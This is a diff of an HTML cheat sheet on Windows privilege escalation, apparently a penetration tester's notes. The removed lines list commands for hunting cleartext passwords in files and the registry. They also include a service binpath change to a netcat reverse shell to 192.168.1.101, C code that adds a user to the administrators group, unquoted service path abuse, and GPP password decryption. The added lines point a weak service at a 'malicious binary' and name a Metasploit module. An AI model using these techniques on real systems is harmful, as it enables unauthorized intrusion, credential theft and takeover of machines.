@@ -3,211 +3,26 @@
 <head>
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
 <title>WindowsPrivilegeEscalation</title>
-</head><body># Basics<br/>
-systeminfo<br/>
-hostname<br/>
+</head><body><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md</a>&nbsp; <br/>
 <br/>
-# Who am I?<br/>
-whoami<br/>
-echo %username%<br/>
+#Weak Service Permission<br/>
 <br/>
-# What users/localgroups are on the machine?<br/>
-net users<br/>
-net localgroups<br/>
+Download the accesschk.exe Tool from below URL.<br/>
+<a href="https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe"><i>https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe</i></a>&nbsp; <br/>
 <br/>
-# More info about a specific user. Check if user has privileges.<br/>
-net user user1<br/>
+accesschk.exe /accepteula -uwcqv "<span style="font-family: inherit">authenticated users</span>"<br/>
 <br/>
-# View Domain Groups<br/>
-net group /domain<br/>
+<i>SERVICES_ALL_ACCESS means user has full control on both of these services and can modify the properties of these services.</i>&nbsp; <br/>
 <br/>
-# View Members of Domain Group<br/>
-net group /domain &lt;Group Name&gt;<br/>
+sc qc weakService <br/>
+Let’s find out the status of these services and if the services is running with high level privileges and what binary path name it has<br/>
 <br/>
-# Firewall<br/>
-netsh firewall show state<br/>
-netsh firewall show config<br/>
+sc config weakService binpath="infected file"<br/>
+Let's modify the service and point its binary to our malicious binary &nbsp; <br/>
 <br/>
-# Network<br/>
-ipconfig /all<br/>
-route print<br/>
-arp -A<br/>
+sc stop weakService<br/>
+sc start weakService<br/>
 <br/>
-# How well patched is the system?<br/>
-wmic qfe get Caption,Description,HotFixID,InstalledOn<br/>
-<br/>
-#Cleartext Passwords Search for them<br/>
-findstr /si password *.txt<br/>
-findstr /si password *.xml<br/>
-findstr /si password *.ini<br/>
-<br/>
-#Find all those strings in config files.<br/>
-dir /s *pass* == *cred* == *vnc* == *.config*<br/>
-<br/>
-# Find all passwords in all files.<br/>
-findstr /spin "password" *.*<br/>
-findstr /spin "password" *.*<br/>
-#In Files These are common files to find them in. They might be base64-encoded. So look out for that.<br/>
-c:\sysprep.inf<br/>
-c:\sysprep\sysprep.xml<br/>
-c:\unattend.xml<br/>
-%WINDIR%\Panther\Unattend\Unattended.xml<br/>
-%WINDIR%\Panther\Unattended.xml<br/>
-<br/>
-# VNC<br/>
-dir c:\*vnc.ini /s /b<br/>
-dir c:\*ultravnc.ini /s /b <br/>
-dir c:\ /s /b | findstr /si *vnc.ini<br/>
-In Registry<br/>
-reg query "HKCU\Software\ORL\WinVNC3\Password"<br/>
-<br/>
-# Windows autologin<br/>
-reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"<br/>
-<br/>
-# SNMP Paramters<br/>
-reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"<br/>
-<br/>
-# Putty<br/>
-reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"<br/>
-<br/>
-# Search for password in registry<br/>
-reg query HKLM /f password /t REG_SZ /s<br/>
-reg query HKCU /f password /t REG_SZ /s<br/>
-<br/>
-# Port forward using plink<br/>
-plink.exe -l root -pw mysecretpassword 192.168.0.101 -R 8080:127.0.0.1:8080<br/>
-<br/>
-# Port forward using meterpreter<br/>
-portfwd add -l &lt;attacker port&gt; -p &lt;victim port&gt; -r &lt;victim ip&gt;<br/>
-portfwd add -l 3306 -p 3306 -r 192.168.1.101<br/>
-<br/>
-#Scheduled Tasks<br/>
-schtasks /query /fo LIST /v<br/>
-<br/>
-#Change the upnp service binary<br/>
-sc config upnphost binpath= "C:\Inetpub\nc.exe 192.168.1.101 6666 -e c:\Windows\system32\cmd.exe"<br/>
-sc config upnphost obj= ".\LocalSystem" password= ""<br/>
-sc config upnphost depend= ""<br/>
-<br/>
-#Weak Service Permissions<br/>
-for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a &gt;&gt; c:\windows\temp\permissions.txt<br/>
-for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"<br/>
-Binaries in system32 are excluded since they are mostly correct, since they are installed by windows.<br/>
-sc.exe<br/>
-sc query state= all | findstr "SERVICE_NAME:" &gt;&gt; Servicenames.txt<br/>
-<br/>
-FOR /F %i in (Servicenames.txt) DO echo %i<br/>
-type Servicenames.txt<br/>
-FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i &gt;&gt; services.txt<br/>
-<br/>
-FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" &gt;&gt; path.txt<br/>
-Now you can process them one by one with the cacls command.<br/>
-cacls "C:\path\to\file.exe"<br/>
-Look for Weakness<br/>
-What we are interested in is binaries that have been installed by the user. In the output you want to look for BUILTIN\Users:(F). Or where your user/usergroup has (F) or (C) rights.<br/>
-Example:<br/>
-C:\path\to\file.exe <br/>
-BUILTIN\Users:F<br/>
-BUILTIN\Power Users:C <br/>
-BUILTIN\Administrators:F <br/>
-NT AUTHORITY\SYSTEM:F<br/>
-That means your user has write access. So you can just rename the .exe file and then add your own malicious binary. And then restart the program and your binary will be executed instead. This can be a simple getsuid program or a reverse shell that you create with msfvenom.<br/>
-Here is a POC code for getsuid.<br/>
-#include &lt;stdlib.h&gt;<br/>
-int main ()<br/>
-{<br/>
-int i;<br/>
-&nbsp; &nbsp; i = system("net localgroup administrators theusername /add");<br/>
-return 0;<br/>
-}<br/>
-We then compile it with mingw like this:<br/>
-i686-w64-mingw32-gcc windows-exp.c -lws2_32 -o exp.exe<br/>
-Restart the Service<br/>
-Okay, so now that we have a malicious binary in place we need to restart the service so that it gets executed. We can do this by using wmic or net the following way:<br/>
-wmic service NAMEOFSERVICE call startservice<br/>
-net stop [service name] &amp;&amp; net start [service name].<br/>
-The binary should now be executed in the SYSTEM or Administrator context.<br/>
-Migrate the meterpreter shell<br/>
-If your meterpreter session dies right after you get it you need migrate it to a more stable service. A common service to migrate to is winlogon.exe since it is run by system and it is always run. You can find the PID like this:<br/>
-wmic process list brief | find "winlogon"<br/>
-So when you get the shell you can either type migrate PID or automate this so that meterpreter automatically migrates.<br/>
-http://chairofforgetfulness.blogspot.cl/2014/01/better-together-scexe-and.html<br/>
-Unquoted Service Paths<br/>
-Find Services With Unquoted Paths<br/>
-# Using WMIC<br/>
-wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """<br/>
-<br/>
-# Using sc<br/>
-sc query<br/>
-sc qc service name<br/>
-<br/>
-# Look for Binary_path_name and see if it is unquoted.<br/>
-If the path contains a space and is not quoted, the service is vulnerable.<br/>
-Exploit It<br/>
-If the path to the binary is:<br/>
-c:\Program Files\something\winamp.exe<br/>
-We can place a binary like this<br/>
-c:\program.exe<br/>
-When the program is restarted it will execute the binary program.exe, which we of course control. We can do this in any directory that has a space in its name. Not only program files.<br/>
-This attack is explained here:<br/>
-http://toshellandback.com/2015/11/24/ms-priv-esc/<br/>
-There is also a metasploit module for this is: exploit/windows/local/trusted_service_path<br/>
-Vulnerable Drivers<br/>
-Some driver might be vulnerable. I don't know how to check this in an efficient way.<br/>
-# List all drivers<br/>
-driverquery<br/>
-AlwaysInstallElevated<br/>
-reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated<br/>
-reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated<br/>
-http://toshellandback.com/2015/11/24/ms-priv-esc/<br/>
-Group Policy Preference<br/>
-If the machine belongs to a domain and your user has access to System Volume Information there might be some sensitive files there.<br/>
-First we need to map/mount that drive. In order to do that we need to know the IP-address of the domain controller. We can just look in the environment-variables<br/>
-# Output environment-variables<br/>
-set<br/>
-<br/>
-# Look for the following:<br/>
-LOGONSERVER=\\NAMEOFSERVER<br/>
-USERDNSDOMAIN=WHATEVER.LOCAL<br/>
-<br/>
-# Look up ip-addres<br/>
-nslookup nameofserver.whatever.local<br/>
-<br/>
-# It will output something like this<br/>
-Address: &nbsp;192.168.1.101<br/>
-<br/>
-# Now we mount it<br/>
-net use z: \\192.168.1.101\SYSVOL<br/>
-<br/>
-# And enter it<br/>
-z:<br/>
-<br/>
-# Now we search for the groups.xml file<br/>
-dir Groups.xml /s<br/>
-If we find the file with a password in it, we can decrypt it like this in Kali<br/>
-gpp-decrypt encryptedpassword<br/>
-Services\Services.xml: Element-Specific Attributes<br/>
-ScheduledTasks\ScheduledTasks.xml: Task Inner Element, TaskV2 Inner Element, ImmediateTaskV2 Inner Element<br/>
-Printers\Printers.xml: SharedPrinter Element<br/>
-Drives\Drives.xml: Element-Specific Attributes<br/>
-DataSources\DataSources.xml: Element-Specific Attributes<br/>
-Escalate to SYSTEM from Administrator<br/>
-On Windows XP and Older<br/>
-If you have a GUI with a user that is included in Administrators group you first need to open up cmd.exe for the administrator. If you open up the cmd that is in Accessories it will be opened up as a normal user. And if you rightclick and do Run as Administrator you might need to know the Administrators password. Which you might not know. So instead you open up the cmd from c:\windows\system32\cmd.exe. This will give you a cmd with Administrators rights.<br/>
-From here we want to become SYSTEM user. To do this we run:<br/>
-First we check what time it is on the local machine:<br/>
-time<br/>
-<br/>
-# Now we set the time we want the system CMD to start. Probably one minuter after the time.<br/>
-at 01:23 /interactive cmd.exe<br/>
-And then the cmd with SYSTEM privs pops up.<br/>
-Vista and Newer<br/>
-You first need to upload PsExec.exe and then you run:<br/>
-psexec -i -s cmd.exe<br/>
-Kitrap<br/>
-On some machines the at 20:20 trick does not work. It never works on Windows 2003 for example. Instead you can use Kitrap. Upload both files and execute vdmaillowed.exe. I think it only works with GUI.<br/>
-vdmallowed.exe<br/>
-vdmexploit.dll<br/>
 <br/>
 #Metasploit<br/>
 use exploit/windows/local/service_permissions<br/>
